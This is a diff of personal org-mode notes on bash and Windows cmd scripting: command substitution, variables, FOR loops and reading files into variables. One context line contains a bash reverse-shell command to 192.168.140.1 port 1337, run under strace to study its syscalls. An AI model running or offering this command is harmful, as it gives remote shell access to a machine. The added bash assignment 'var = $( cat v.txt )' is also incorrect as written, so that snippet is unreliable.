@@ -355,6 +355,11 @@
       - ~strace -f bash -c 'bash -i >& /dev/tcp/192.168.140.1/1337 0>&1' > strace.out 2>&1~ // -f: trace child processes created, as a result of the fork(2), vfork(2), and clone(2) system calls (quote: man strace). grep -n 192.168.140.1 strace.out, check syscalls around the line
     + ~ltrace -f ls~ // -f: same with strace -f.
 
+*** cat file to variable
+    #+begin_src
+    var = $( cat v.txt )
+    #+end_src
+
 ** TODO bash scripting
    + man bash
    + ~#!~ //the "shebang"
@@ -362,12 +367,12 @@
 
 *** basic syntax
     + // *the dollar sign is evaluated within double quotes, but not within single quotes*
-    #+begin_src
-    x=1; echo $x        # variables. Note: no space 
-    echo "1 + $x"       # '1 + 1'.
-    echo '1 + $x'       # '1 + $x'
-    y2=1+$x             # "1+1"
-    #+end_src
+      #+begin_src
+      x=1; echo $x        # variables. Note: no space 
+      echo "1 + $x"       # '1 + 1'.
+      echo '1 + $x'       # '1 + $x'
+      y2=1+$x             # "1+1"
+      #+end_src
 
     + // *command substitution and subshell*:
       - ~$(command)~
@@ -441,6 +446,7 @@
     
     
 ** cmd scripting
+
 *** basic
     #+begin_src bat
     @echo off
@@ -453,6 +459,7 @@
 
     @echo off 
     #+end_src
+
 **** ~set~ //variables
      #+begin_src bat
      REM set                                  //list all existing env variables
@@ -468,6 +475,13 @@
      ENDLOCAL
      #+end_src
 
+**** ~for~ // no, use powershell
+     + ~FOR /F "tokens=1-5" %%A IN ("This is a short sentence") DO @echo %%A %%B %%D~
+     + ~FOR %%G IN (a,b,c) DO (md %%G)~ // mkdir a,b,c
+     + //%% vs %, expect %% in .bat script file, expect % in a cmd prompt.
+
+*** cat to variable
+    + ~powershell -c "$v=cat file; $v"~
 
 ** cmd utilities
    + ~pathping -n ip~ //route tracing utility.
